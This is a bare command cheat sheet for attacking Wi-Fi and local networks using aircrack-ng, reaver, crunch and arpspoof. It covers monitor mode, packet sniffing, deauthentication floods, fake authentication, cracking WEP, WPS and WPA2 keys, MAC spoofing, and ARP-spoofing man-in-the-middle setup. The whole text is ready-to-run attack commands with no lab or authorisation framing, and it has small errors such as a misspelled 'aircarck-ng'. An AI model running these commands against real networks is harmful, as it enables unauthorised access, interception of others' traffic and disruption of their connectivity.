00 - Common tools usage

------------------------------------------------

-> Set QWERTY mapkeys
setxkbmap -layout it


-> Set your interface in monitor mode
iwconfig
airmon-ng check kill
ifconfig <interface> down
iwconfig <interface> mode monitor
ifconfig <interface> up


-> Change MAC Address ( new fake address must start with 00 )
ifconfig <interface> hw ether 00:11:22:33:44:55


-> Start sniffing packets
airodump-ng <interface>
airodump-ng --bssid <bssid> --channel <channel> --write <filename> <interface>


-> Deauthentication attack
aireplay-ng --deauth 100000000 -a <bssid_network> -c <bssid_target> <interface>
->for 5ghz
aireplay-ng --deauth 100000000 -a <bssid_network> -c <bssid_target> -D <interface>


-> Fake Auth attack
aireplay-ng --fakeauth 0 -a <bssid_network> -h <bssid_target> <interface>


-> Crack WEP Network
aireplay-ng --fakeauth 0 -a <bssid_network> -h <your_MAC> <interface>
aireplay-ng --arpreplay -b <bssid_network> -h <your_MAC> <interface>
aircrack-ng <file>.cap


-> Check if WPS is enabled in network
wash --interface <interface>


-> Crack WPS network
reaver --bssid <bssid_target> --channel <channel_target> --interface 
<interface> --vvv --no-associate


-> Generate a wordlist
crunch <min><max> <characters_set> [-t <pattern>] [-o <filename>]


->Crack WPA2 network with wordlist in storage
-> aircarck-ng <file_handshake>.cap -w <wordlist>.txt


->Crack WPA2 network without wordlist in storage
-> crunch <min> <max> | aircrack-ng -w - -b <bssid_network> <file_handshake>.cap


->Discover all devices connected to your network
netdiscover -r <inet_ip>/24


-> ARP Spoofing 
arp -a
arpspoof -i <interface> -t <clientIP> <gatewayIP>
arpspoof -i <interface> -t <gatewayIP> <clientIP>
echo 1 > /proc/sys/net/ipv4/ip_forward

